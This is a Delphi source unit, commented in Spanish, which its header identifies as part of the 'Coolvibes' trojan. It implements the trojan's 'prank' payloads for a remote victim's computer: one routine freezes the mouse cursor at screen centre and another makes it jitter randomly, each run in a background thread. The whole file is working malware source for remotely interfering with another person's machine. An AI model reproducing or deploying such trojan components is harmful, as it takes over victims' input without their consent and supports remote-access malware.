{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
para relaizar distintos tipos de bromas en el sistema remoto}
unit UnitBromas;

interface

uses
  Windows,
  UnitFunciones;

procedure CongelarMouse(Bool: boolean);
procedure TemblarMouse(Bool: boolean);

implementation

var
  MouseIsCongelado: boolean = False;
  MouseIsTemblando: boolean = False;

procedure CongelarMouse(Bool: boolean);
//Esta función está dentro de CongelarMouse ya que solo se usa aquí
  procedure FijarCursor;
  begin
    while MouseIsCongelado do
    begin
      SetCursorPos(AnchuraPantalla() div 2, AlturaPantalla() div 2);
      //Fija el cursor en la mitad de la pantalla
      Sleep(50);
    end;
  end;

var
  id: cardinal;
begin
  if Bool = False then
  begin
    MouseIsCongelado := False;
  end
  else
  begin
    MouseIsCongelado := True;
    BeginThread(nil, 0, @FijarCursor, nil, 0, id);
    //Empieza en un nuevo Thread la Funcion FijarCursor
  end;
end;

procedure TemblarMouse(Bool: boolean);

  procedure MouseTemblando;
  var
    Direccion: byte;
    Coord:     TPoint;
  begin
    while MouseIsTemblando do
    begin
      Direccion := Random(4); //devuelve un aleatorio entre 0 y 3
      case direccion of
        0:
        begin
          GetCursorPos(Coord);
          SetCursorPos(Coord.x + 4, coord.y + 4);
        end;
        1:
        begin
          GetCursorPos(Coord);
          SetCursorPos(Coord.x + 4, coord.y - 4);
        end;
        2:
        begin
          GetCursorPos(Coord);
          SetCursorPos(Coord.x - 4, coord.y - 4);
        end;
        3:
        begin
          GetCursorPos(Coord);
          SetCursorPos(Coord.x - 4, coord.y + 4);
        end;
      end;
      Sleep(30);
    end;
  end;

var
  id: cardinal;
begin
  if Bool = False then
  begin
    MouseIsTemblando := False;
  end
  else
  begin
    MouseIsTemblando := True;
    BeginThread(nil, 0, @MouseTemblando, nil, 0, id);
    //Empieza en un nuevo Thread la Funcion MouseTemblando
  end;
end;

begin
  Randomize;  //Para que la función random tome valores distintos en cada ejecución
end.
